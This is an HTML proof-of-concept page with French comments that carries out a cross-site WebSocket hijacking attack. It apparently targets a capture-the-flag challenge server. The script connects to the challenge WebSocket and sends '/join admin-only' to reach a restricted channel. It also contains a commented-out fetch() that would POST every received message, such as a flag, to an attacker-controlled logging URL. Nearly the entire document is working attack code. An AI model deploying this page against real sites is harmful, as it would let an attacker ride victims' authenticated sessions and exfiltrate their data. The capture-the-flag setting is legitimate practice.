<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8" />
  <title>WebSocket CSRF PoC</title>
</head>
<body>
  <script>
    // Adapte l’URL ici :
    var socket = new WebSocket("ws://any.challenge.pwn4love.com:20002/");

    socket.onopen = function() {
      console.log("[*] WebSocket ouvert");
      // Test : envoie un message, un slash-commande, etc.
      socket.send("/join admin-only"); 
      // Selon le protocole, tu peux tester : socket.send("JOIN #admin-only");
    };

    socket.onmessage = function(e) {
      console.log("[*] Message reçu :", e.data);
      // Ici tu peux exfiltrer les données vers un autre serveur si tu reçois le flag
      // fetch("https://ton-domaine.com/log.php", {
      //   method: "POST",
      //   body: e.data
      // });
    };

    socket.onerror = function(e) {
      console.error("[!] Erreur WebSocket", e);
    };
  </script>
</body>
</html>
